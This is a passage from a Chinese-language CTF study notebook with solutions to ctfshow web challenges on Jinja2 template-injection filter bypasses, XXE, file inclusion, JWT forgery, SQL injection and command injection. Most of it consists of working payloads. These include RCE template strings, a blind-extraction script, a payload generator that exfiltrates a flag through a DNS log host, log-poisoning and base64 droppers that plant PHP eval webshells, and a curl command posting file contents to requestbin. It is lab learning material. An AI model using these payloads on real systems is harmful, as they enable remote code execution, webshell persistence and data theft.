?name={{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```

- `x.__init__.__globals__`是有`'__builtins'`这个属性的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676015314568-46af4a07-b230-4bb6-98da-5d35fa76f4b3.png#averageHue=%23e0dfdc&clientId=u34e1e24c-4d73-4&from=paste&height=553&id=ubc8e4ffa&originHeight=1106&originWidth=2608&originalType=binary&ratio=2&rotation=0&showTitle=false&size=380100&status=done&style=none&taskId=u1f9c57b9-a2a6-4b2a-8271-a10b149e27b&title=&width=1304)

- `x.__init__.__globals__['__builtins__']`中存在eval

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676015409509-c60dd2f9-3541-4149-b29d-b41de336e7b4.png#averageHue=%23e1dfdd&clientId=u34e1e24c-4d73-4&from=paste&height=560&id=ud20ce8d8&originHeight=1120&originWidth=2744&originalType=binary&ratio=2&rotation=0&showTitle=false&size=375372&status=done&style=none&taskId=ued0ec0da-ea4a-477c-84dc-a0d3713f81d&title=&width=1372)
### 方法3：{% %}

- **{% %}**主要用来声明变量，也可以用于条件语句和循环语句。
```python
{% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}
```
## web 363(过滤单引号)

- request绕过 包括get post cookie
:::info

1. get传参：request.args.name 
2. cookie传参：request.cookies.name
3. post传参：request.values.name
:::
### 方法1：url_for
#### __builtins

```python
?a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()&name={{u
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           rl_for.__globals__[request.args.a][request.args.b](request.args.c)}}
```
### os
```python
a=os&b=popen&c=cat /flag&name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}
```
## web 365(过滤中括号[])
:::info

1. **点绕过：**对于globals中的属性可以用`.`代替中括号访问

即：`url_for.__globals__.os`

2. **getitem绕过：**对于元组来说，可以用getitem(位置）进行访问，getitem还可以直接获取元素
:::
```python
?name={{x.__init__.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)}}

Cookie传参：x2=__import__('os').popen('cat /f*').read();x1=__builtins__
```
## web 366(过滤下划线_)
### 方法1：16进制编码
:::info

- 该方法需要在每组外加中括号[]，所以当过滤`[]或"`时，不能用这种方法
- 可以只对下划线编码，也可以对class这种也编码
:::
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676031008980-d746d958-9335-4b4e-a040-8ae25f1d2139.png#averageHue=%23f9f9f8&clientId=u0c8a6e56-873f-4&from=paste&height=227&id=ua3481a6f&originHeight=454&originWidth=1974&originalType=binary&ratio=2&rotation=0&showTitle=false&size=70361&status=done&style=none&taskId=u3f2cc343-56dd-4c5b-ae81-cfd27fc7ae2&title=&width=987)
```python
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()}}
```

- 第一个的`()`也可以换成`""`
### 方法2：attr+request
[SSTI模板注入绕过（进阶篇）_yu22x的博客-CSDN博客_ssti 关键词绕过](https://blog.csdn.net/miuzzx/article/details/110220425)

- 它是一种过滤器，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数
:::info
Get an attribute of an object. `foo|attr("bar")` works like foo.bar just that always an attribute is returned and items are not looked up.
:::
```python
""|attr("__class__")
相当于
"".__class__

```

- 也就是括号内的东西是前面的属性
#### payload

- 根据前面的payload
```python
?name={{x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)(request.cookies.d)|attr(eval(request.cookies.e))}}
a=__init__&b=__globals__&c=__getitem__&d=__builtins__&e=__import__('os').popen('cat /f*').read()
```
### 方法3：lipsum

- lipsum.__globals__['__builtins__']
- lipsum的globals中有os，有builtins
```python
name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
传参：a=__globals__;b=cat /f*
```
:::danger

- 这里我不明白为什么一定要用attr，不能用`.`
- 且要注意最前面有括号，把lipsum的东西当成一个整体
:::
## web 367(get)
:::info

- 注意不能直接`(lipsum|attr(request.cookies.a)).(request.cookies.b)`，这样会报错，要用**get**
- **不理解为什么也不能用attr**
:::
```python
(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()

a=__globals__&b=os&c=cat /flag
```
## web 368(过滤{{)
### 方法1：{%%}
:::info

- 用`**{%%}**`绕过
:::
```python
{%print((lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read())%}

a=__globals__&b=os&c=cat /flag
```
### 方法2：盲注绕过
:::info

- `open('/flag').read()`是回显整个文件
- read函数里加上参数：`open('/flag').read(1)`,返回的就是读出所读的文件里的i个字符
:::
```python
import requests

url="http://3db27dbc-dccc-46d0-bc78-eff3fc21af74.chall.ctf.show:8080/"
flag=""
for i in range(1,100):
    for j in "abcdefghijklmnopqrstuvwxyz0123456789-{}":
        params={
            'name':"{{% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read({}) %}}{{% if a==request.values.d %}}feng{{% endif %}}".format(i),
            'a':'__globals__',
            'b':'__builtins__',
            'c':'/flag',
            'd':f'{flag+j}'
        }
        r=requests.get(url=url,params=params)
        if "feng" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break


```
## web 369(过滤request)
### 拼接字符串
#### join

- 拼接字符串
```python
var1 = "Hello"
var2 = "World"
 
# join() method is used to combine the strings
print("".join([var1, var2]))

#输出HelloWorld

# join() method is used here to combine
# the string with a separator Space(" ")
var3 = " ".join([var1, var2])
 
print(var3)

#输出Hello World
```
```python
var3 = dict(po=1,p=2)
print("".join(var3))
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676086105844-cd1e3c1f-ec6c-444f-a385-6232de0ce212.png#averageHue=%23212120&clientId=uef09e2d1-bf88-4&from=paste&height=32&id=u4895a3c5&originHeight=64&originWidth=313&originalType=binary&ratio=2&rotation=0&showTitle=false&size=2954&status=done&style=none&taskId=ua1c0713f-94b3-4826-a54f-8c634852e21&title=&width=156.5)
#### ~

- 拼接字符串
```python
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}

#意思就是{{""['__class__']}}
```

- 输出结果为：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676102172951-6bcffeb9-c621-4b68-bd58-2bfa99eddfdb.png#averageHue=%23ecebea&clientId=u34133bce-2d15-4&from=paste&height=41&id=z1SuT&originHeight=82&originWidth=450&originalType=binary&ratio=2&rotation=0&showTitle=false&size=5299&status=done&style=none&taskId=uec11d7b0-38de-4c86-9fcd-eed025dec61&title=&width=225)
#### %2b
```python
name={%set a='_'%}{% set ini=a%2ba%2b'class'%2ba%2ba%}{%print(ini)%}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676104111199-35a1f893-2863-43db-8ec8-21761613c029.png#averageHue=%23f5f4f4&clientId=u34133bce-2d15-4&from=paste&height=63&id=uc0f6cdf0&originHeight=126&originWidth=408&originalType=binary&ratio=2&rotation=0&showTitle=false&size=4254&status=done&style=none&taskId=u82c5368d-5a5b-4440-a333-2cb6105e3d6&title=&width=204)
### payload
:::info
这题过滤了request，只能拼接字符<br />`~ 和 join`都可以拼接字符

- **在得到**`**/flag**`**后，用**`**open('/flag')**`**打开，这个之前不知道**
- **%2b应该也是字符串拼接**
:::

**拿出一句分析一下：**
```python
#后面没有join
{%set a='_'%}{% set ini=(a,a,dict(init=a)|join,a,a)%}{%print(ini)%}

#后面有join
{%set a='_'%}{% set ini=(a,a,dict(init=a)|join,a,a)|join%}{%print(ini)%}
```

- 没有join的输出

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676102802367-0a31bf8b-f55e-4451-ac6b-723b4e6feadf.png#averageHue=%23f4f3f3&clientId=u34133bce-2d15-4&from=paste&height=50&id=ud8fefee4&originHeight=99&originWidth=621&originalType=binary&ratio=2&rotation=0&showTitle=false&size=5169&status=done&style=none&taskId=u1dbb5f59-9544-4448-bb8e-de484226c14&title=&width=310.5)

- 有join的输出

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676102860492-a5e3a272-6044-4e81-812a-9af30f07ecef.png#averageHue=%23f9f9f9&clientId=u34133bce-2d15-4&from=paste&height=82&id=u5d3be2e1&originHeight=164&originWidth=525&originalType=binary&ratio=2&rotation=0&showTitle=false&size=3611&status=done&style=none&taskId=u2ec9b8e4-2482-4a6d-b1ea-ae32d4cade5&title=&width=262.5)
:::info
总结：

1. 第一个join只是拼接dict中的key
2. 第二个join是把整体拼接在一起
3. 最后一个join后可以没有`()`
:::

```python
?name=
{% set po=dict(po=a,p=a)|join%}#po = pop
{% set a=(()|select|string|list)|attr(po)(24)%}#pop 24是下划线_
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}#__init__
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}#__globals__
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}#__getitem__
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}#__builtins__
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}#x=q.__init__.__globals__.['__builtins__']
{% set chr=x.chr%}		#获取chr
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}	#拼接/flag
{%print(x.open(file).read())%}	#打开flag
```

- 上面的`%2b`也可以用`~`
```python
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
```

- 也可以用join
```python
{% set file=(chr(47),chr(102),chr(108),chr(97),chr(103))|join%}
```
## web 370(过滤数字)
:::info

1. 过滤数字就想办法找到可以数字母个数的函数
2. `count`或者`length`都可以
3. **其实这些思想前面都有，需要好好总结一下**
:::

```python
?name=
{% set c=(dict(e=a)|join|count)%}
{% set cc=(dict(ee=a)|join|count)%}
{% set ccc=(dict(eee=a)|join|count)%}
{% set cccc=(dict(eeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set coun=(cc~cccc)|int%}
#构成了从1-10的数字，替换前面payload的数字就可以了
```
## web 371(过滤print)
:::info
**之前的构造：**

- 之前是找到`__builtins__`中的`chr`，之后构造`cat /flag`，`print(open(file))`

现在不能open了，翻到最开始的命令<br />`?name={{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}`

- 最后是eval，eval中的命令在无回显时可以用**curl带出，或者反弹shell，开启监听**
:::

```python
{% set c=(t|count)%}
{% set cc=(dict(e=a)|join|count)%}
{% set ccc=(dict(ee=a)|join|count)%}
{% set cccc=(dict(eee=a)|join|count)%}
{% set ccccc=(dict(eeee=a)|join|count)%}
{% set cccccc=(dict(eeeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}
{% set coun=(ccc~ccccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=
%}
{%if x.eval(cmd)%}
abc
{%endif%}
```

- 上面这段代码用一个字母`c`的时候表示数字0，2个字母`c`的时候表示数字2
- `chr`是通过ASCII码获取字符，`chr(95)`得到的字符是`_`
- cmd通过下面的代码生成
```python
def aaa(t):
	t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'
	return t
s='__import__("os").popen("curl `cat /flag`.du9dan.dnslog.cn").read()'
def ccchr(s):
	t=''
	for i in range(len(s)):
		if i<len(s)-1:
			t+='chr('+aaa(str(ord(s[i])))+')%2b'#ord获取ASCII码，str转字符串
  
		else:
			t+='chr('+aaa(str(ord(s[i])))+')'
	return t
if __name__ == '__main__':  
    print(ccchr(s))

```

- `(int(t[:-1:])+1)`是取字符ASCII码的最后一位之前的部分
- `_`的ASCII码是95，就需要`10个c + 6个c`，因为10个`c`表示9

## web 372(过滤count)

- 用length替代，作用等同于count

## 扩展：全角字符代替半角字符
:::info

- 过滤数字的题可以用这种方式秒杀
:::
### 全角 vs 半角

1. 全角：是一种电脑字符，一个全角字符占两个字节。
- 汉字字符和规定了全角的英文字符及国标GB2312-80中的图形符号和特殊字符都是全角字符。
- 在全角中，字母和数字等与汉字一样占据着等宽的位置。
- 汉语、日语、及朝鲜文等象形字语言的字库量远大于256个编码空间，所以改用两个字节来储存。
2. 半角：是指一个字符占用一个标准的字符位置。半角占一个字节。英文就是半角

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676272482837-70d7d2bf-b0a3-44be-98ec-97527a9c7a7f.png#averageHue=%23fdfcfc&clientId=u0c341530-6213-4&from=paste&height=213&id=u40fdfb9e&originHeight=425&originWidth=1105&originalType=binary&ratio=2&rotation=0&showTitle=false&size=59287&status=done&style=none&taskId=ufa180c8b-9e4c-42ca-9261-cbb01b33f51&title=&width=552.5)
### 全角和半角的转换
[http://www.yuxang.com/%E5%85%A8%E8%A7%92%E5%92%8C%E5%8D%8A%E8%A7%92%E7%9A%84%E5%8C%BA%E5%88%86/](http://www.yuxang.com/%E5%85%A8%E8%A7%92%E5%92%8C%E5%8D%8A%E8%A7%92%E7%9A%84%E5%8C%BA%E5%88%86/)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676272631546-43852125-2bf5-4869-bd1a-817f84bcd25e.png#averageHue=%23fcfbfb&clientId=u0c341530-6213-4&from=paste&height=715&id=udf297a17&originHeight=1430&originWidth=1643&originalType=binary&ratio=2&rotation=0&showTitle=false&size=115638&status=done&style=none&taskId=ueb782d8b-ed2e-46fa-9276-5fda9d0fb6d&title=&width=821.5)

- 可以看到全角字符中数字的Unicode码值减半角字符的Unicode码值的结果为

![](https://cdn.nlark.com/yuque/__latex/93ac8c14a948a9381b3954bcb9c352ac.svg#card=math&code=ff10-0030%3Dfee0&id=XEr7p)

- 所以转换脚本为：
```python
def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)
```
## SSTI总结
![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1677161451974-5c69b8e6-ba53-4ec0-9ddc-9ba86f08aee6.jpeg)

# 14. XXE(XML External Entity Injection)
## 参考文章
[一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区](https://xz.aliyun.com/t/3357)<br />[DTD 简介](https://www.w3school.com.cn/dtd/dtd_intro.asp)<br />[XXE(XML External Entity attack)XML外部实体注入攻击 - FreeBuf网络安全行业门户](https://www.freebuf.com/column/181064.html)
## XXE漏洞成因
### XML外部实体
![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1676431108001-e4a44dd6-01e6-4743-9fcd-4ca62358b252.jpeg#averageHue=%232b2c25&clientId=u33ed94a5-0591-4&from=paste&id=u4eadcc1e&originHeight=166&originWidth=690&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ufea4fdf7-97d4-44a0-82e8-661f01ddee3&title=)

1. 一般实体的声明：

引用一般实体的方法：&实体名称;<br />p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。<br />2. 参数实体的声明：<br />引用参数实体的方法：%实体名称;<br />p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用

1. 内部实体声明
- 当引用一般实体时，由三部分构成：&、实体名、
- 当是用参数传入xml的时候，&需URL编码，不然&会被认为是参数间的连接符号。

示例：

```
<?xml version = "1.0" encoding = "utf-8"?>
<!DOCTYPE test [
<!ENTITY writer "Dawn">
<!ENTITY copyright "Copyright W3School.com.cn">
]>
<test>&writer;©right;</test>
```

2. 外部实体声明

`<!ENTITY 实体名称 SYSTEM "URI/URL">`

- 外部实体可支持http、file等协议
## web 373(有回显)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676431391524-8e12e0f1-390c-4eca-90fb-dc20079d684b.png#averageHue=%23fefefe&clientId=u33ed94a5-0591-4&from=paste&height=181&id=uc608b171&originHeight=362&originWidth=908&originalType=binary&ratio=2&rotation=0&showTitle=false&size=44209&status=done&style=none&taskId=ub88838f8-95fe-4f32-8274-c714f1fe31e&title=&width=454)

- 发现有回显，用file协议读取flag
```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<x>
<ctfshow>&xxe;</ctfshow>
</x>
```
`<!DOCTYPE 根元素 [元素声明]>`

- 也就是服务器在loadXML后，会把`<x>`赋值给`$creds`
- `$creds`读取`ctfshow`，界面输出flag
# 15. 黑盒测试
## web 381(扫描目录)

- 没见过的目录，`page.php?id=flag`
- `dirsearch`的字典在`/db/dicc.txt`中，把目录加进去
## web 382(地址在源代码里)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676513839649-bff93f85-d8d2-4d62-9201-a8eb963fb20d.png#averageHue=%23fefdfc&clientId=u756874a2-c2da-4&from=paste&height=403&id=u0185bd5b&originHeight=806&originWidth=1664&originalType=binary&ratio=2&rotation=0&showTitle=false&size=161412&status=done&style=none&taskId=u9f4a3639-51b3-4fe7-8832-2ac75e00e04&title=&width=832)
:::info

- 要看源码中的奇怪的东西
- 第一个是后台地址
- 第二个是可能存在的目录，`page.php`
:::
## web 383(万能密码登录)

- 在找到源码中的后台地址后，用万能密码登录
- 这里就猜测用户名是admin,密码也是admin
```sql
admin' or 1=1 #

admin
```
## web 386(猜—file读取)

- 扫描后台发现`clear.php`（其实我没扫出来）
- 按照上一题，访问`install`![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676520415881-4f4e6993-021f-4e12-9222-151743db9b4a.png#averageHue=%23fcfbfa&clientId=uf6ab8429-9320-4&from=paste&height=181&id=u187e6659&originHeight=361&originWidth=1533&originalType=binary&ratio=2&rotation=0&showTitle=false&size=65165&status=done&style=none&taskId=u722a292c-65ef-4348-9da1-2f2afe36b32&title=&width=766.5)
- 所以要想办法删除`lock.dat`
- 猜`clear.php`的参数是`file`，删除一下`index.php`试试，发现确实删除了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676520510540-35724b75-6e24-42d3-831d-2b0f78868a61.png#averageHue=%23fbfbfa&clientId=uf6ab8429-9320-4&from=paste&height=272&id=ubf7b12d0&originHeight=543&originWidth=1941&originalType=binary&ratio=2&rotation=0&showTitle=false&size=71502&status=done&style=none&taskId=u966f5f82-f836-442a-84bb-80577c6e2a5&title=&width=970.5)

- 删除`lock.dat`
- 重复上一题的过程
## web 387(unlink删除)

- 扫描后台发现`/debug`（我也没扫到）

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676522288963-9a0c869d-240b-4b1c-94fd-6791bfcd5d99.png#averageHue=%23fefdfc&clientId=uf6ab8429-9320-4&from=paste&height=200&id=ued9b1096&originHeight=399&originWidth=1605&originalType=binary&ratio=2&rotation=0&showTitle=false&size=56114&status=done&style=none&taskId=u3df36098-4c3d-417b-b72a-8dfd3a949a2&title=&width=802.5)

- 那就给他一个file参数
```php
?file=/etc/passwd
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676522332043-34d82eb6-4fbc-4e25-aff5-f9ef28094100.png#averageHue=%23edeae8&clientId=uf6ab8429-9320-4&from=paste&height=298&id=u2006443b&originHeight=596&originWidth=2041&originalType=binary&ratio=2&rotation=0&showTitle=false&size=231948&status=done&style=none&taskId=u94dcc011-5de8-4200-a364-de68484606c&title=&width=1020.5)

- 可以执行，说明存在文件包含漏洞
- 用包含日志的方法，但是无法上传参数
### 方法1：system读取
```php
<?php system('cat /var/www/html/alsckdfy/check.php > /var/www/html/1.txt')?>
```

- 直接访问1.txt
### 方法2：unlink删除
```php
<?php unlink('/var/www/html/install/lock.dat')?>
```

- 删除之后，重新访问`/install`，重复上面的过程
## web 388(编辑器漏洞及日志+免杀)
### 编辑器漏洞
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676533572710-617a0246-4b5a-4af3-b947-ba020f41f495.png#averageHue=%23fefdfc&clientId=u30fde60b-3299-4&from=paste&height=619&id=u0fc2c188&originHeight=1238&originWidth=1926&originalType=binary&ratio=2&rotation=0&showTitle=false&size=268618&status=done&style=none&taskId=u1f4f4c10-49da-4b9c-9414-88e14e99aa7&title=&width=963)

- 这个很像一个编辑器的路径，访问`/alsckdfy/editor`试一下

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676533667476-274a181e-35a5-43de-84e4-0a5131f07806.png#averageHue=%23fbfbfa&clientId=u30fde60b-3299-4&from=paste&height=306&id=u4068fc6d&originHeight=611&originWidth=1784&originalType=binary&ratio=2&rotation=0&showTitle=false&size=88967&status=done&style=none&taskId=u9e554e51-9975-49b2-bd8f-346129789f0&title=&width=892)

- 这里有编辑器，且版本是4.1(有html上传漏洞)
- 构造免杀马
```php
<?php 
system('echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==" | base64 -d > /var/www/html/shell.php');
?>
```

- 接着访问上传的文件，`debug=xxxxxxxxxxxxx.txt`，getshell

### 日志+免杀脚本
:::info

- 思路是向日志中写免杀马
- 文件包含日志，查看b.php
:::
```python
import requests
import base64
url="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/"
url2="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log"
cmd=b"<?php eval($_POST[1]);?>"
cmd=base64.b64encode(cmd).decode()
headers={
	'User-Agent':'''<?php system('echo {0}|base64 -d  > /var/www/html/b.php');?>'''.format(cmd)
}
print(headers)
requests.get(url=url,headers=headers)
requests.get(url2)
print(requests.post(url+'b.php',data={'1':'system("cat alsckdfy/check.php");'}).text)


```
## web 389(jwt)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676539626928-1e421172-4ddd-4192-be0c-5f2fa082ba61.png#averageHue=%23e1e2e2&clientId=u30fde60b-3299-4&from=paste&height=59&id=u3e5ec41b&originHeight=117&originWidth=1380&originalType=binary&ratio=2&rotation=0&showTitle=false&size=12734&status=done&style=none&taskId=uf84b0ccd-5522-4ea9-985e-40ccceac3ee&title=&width=690)
:::info
cookie的格式是name = value

- **记得写auth**
:::

- 和前面学的一样，把签名算法改成`none`
- 在上一题的脚本加个Cookie
```python
cookie = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NjUzNzkxOCwiZXhwIjoxNjc2NTQ1MTE4LCJuYmYiOjE2NzY1Mzc5MTgsInN1YiI6ImFkbWluIiwianRpIjoiZTBiN2NlYzg4NzA5MDk4NzNiYzY1ZjQ2OTcxMmYwYjkifQ.'
headers2={
    'Cookie':f'auth={cookie}'
}
```

- 下面几个题，可以用这个办法通杀
## web 390(sqlmap --file-read)
:::info
`sqlmap -u "url" --file-read /flag.php`直接读取文件并下载到本地
:::

- 点开页面，发现`page.php`界面可能存在注入

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676687229927-658d2257-c0bf-4875-b6d7-0c579b596581.png#averageHue=%23f1e4ae&clientId=u7803a2e1-199d-4&from=paste&height=248&id=u9b9d75b7&originHeight=495&originWidth=1482&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75636&status=done&style=none&taskId=uca47ea4c-40bf-4c26-b4e6-3734f14d0d2&title=&width=741)

- 用sqlmap
```shell
sqlmap -u "url" --file-read /var/www/html/alsckdfy/check.php --batch
```

- `--batch`表示测试过程中执行所有默认配置
## web 391(同上)

- 换注入点了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676687669994-954991ff-3deb-48ef-bf70-f4aa55d7f2c3.png#averageHue=%23e9d49d&clientId=u7803a2e1-199d-4&from=paste&height=266&id=uc996abf8&originHeight=532&originWidth=1521&originalType=binary&ratio=2&rotation=0&showTitle=false&size=65182&status=done&style=none&taskId=ud76fc631-1959-4eaa-8dfb-5d72130c299&title=&width=760.5)

- 继续用上面的命令
## sqlmap 392(--os -shell)

- 获取shell
```python
sqlmap -u "url" --os-shell
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676688029243-abe35f99-3456-445c-8b05-f7507d5efaa2.png#averageHue=%23252b37&clientId=u7803a2e1-199d-4&from=paste&height=273&id=u263a8e80&originHeight=546&originWidth=1215&originalType=binary&ratio=2&rotation=0&showTitle=false&size=304501&status=done&style=none&taskId=u33fe0b9c-852e-42cb-8fd3-cc6a41e134e&title=&width=607.5)
## sqlmap 393(sqlmap+ssrf)

- 这个题`--file-read`和`--os-shell`不好使了
- 爆数据库的表名和列名

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676689465816-d662e21a-b778-4522-afed-a983b27763d0.png#averageHue=%23292f3c&clientId=u7803a2e1-199d-4&from=paste&height=180&id=uca4e3f7a&originHeight=359&originWidth=718&originalType=binary&ratio=2&rotation=0&showTitle=false&size=154408&status=done&style=none&taskId=u9a6ea37d-6959-4a52-85d8-917ed984154&title=&width=359)

- 发现存在一个table`link`中存着url，而此时首页中显示出了一个搜索框

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676689502450-a4a56702-8c0e-4ab0-830b-f7af287168c6.png#averageHue=%23f5f5f5&clientId=u7803a2e1-199d-4&from=paste&height=210&id=uf62f11ab&originHeight=420&originWidth=1821&originalType=binary&ratio=2&rotation=0&showTitle=false&size=19541&status=done&style=none&taskId=udca5da81-d537-4340-8754-86ab0f4bbeb&title=&width=910.5)

- 这就说明是从数据库中获取的url，并且执行了这个命令，跳转到百度的界面
- 那是否可以添加一列`file:///flag`让她显示在前端呢？
- 在`search.php`界面进行堆叠注入
```shell
title = 1';insert into link values(10,'a','file:///flag');#
```

- 百度的界面是`id = 4`，所以`insert`的时候要加一个`id`方便访问

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676690441459-8e3a5a23-f217-4f5f-bd50-4f1261af1203.png#averageHue=%23f1efee&clientId=u7803a2e1-199d-4&from=paste&height=529&id=HJggT&originHeight=1057&originWidth=2139&originalType=binary&ratio=2&rotation=0&showTitle=false&size=103548&status=done&style=none&taskId=u3b251971-cbf1-49f5-a84f-ab95fb7f6cf&title=&width=1069.5)

- 访问`id = 20`即可得到flag

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676690509855-47db1bef-4d46-4307-88b3-0e2b45cffb27.png#averageHue=%23c9d8c5&clientId=u7803a2e1-199d-4&from=paste&height=175&id=u8a74372c&originHeight=350&originWidth=1486&originalType=binary&ratio=2&rotation=0&showTitle=false&size=70452&status=done&style=none&taskId=ucb11dce2-0c4a-4bf0-9875-9a12c5e2091&title=&width=743)
## web 394、395(打redis)
## 总结
![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1676691660135-d8521e79-bc19-4dbe-814a-5c1230c59172.jpeg)

# 16. 其他
## web 402(parse_url过滤http)

- 用ftp代替，就是换个协议名

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676711526311-0d9528b7-51b5-49cd-a8b7-202d2d5b3ac0.png#averageHue=%23fefdfd&clientId=u3c4aa95e-20da-4&from=paste&height=202&id=u54280d33&originHeight=403&originWidth=999&originalType=binary&ratio=2&rotation=0&showTitle=false&size=43227&status=done&style=none&taskId=u6055f17d-b150-4ea3-940f-81dff65f7fb&title=&width=499.5)
## web 403(;结束命令)
### curl外带之又学一招
[http://requestbin.cn/](http://requestbin.cn/)
:::info
-d/--data <data>                  HTTP POST方式传送数据
:::

- 之前学过用burp作为服务器，现在可以用`requestbin.net`接收数据
### payload
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676713972467-4d20a26b-a582-45ed-ae32-37a0569640a9.png#averageHue=%23fefdfd&clientId=u3c4aa95e-20da-4&from=paste&height=151&id=ua049b903&originHeight=302&originWidth=1481&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36844&status=done&style=none&taskId=u4e22b444-4414-4973-bdab-f5caac831d8&title=&width=740.5)

- 这里表示`host`得是个合法ip，即`127.0.0.1`这种
- 用`;`结束前面的命令，构造一个`curl`
```shell
url=http://227.220.220.21/1.php;curl -X POST -d "flag=`cat fl0g.php`" http://requestbin.cn:80/17c2ouo1
```

- 在网站中查看结果

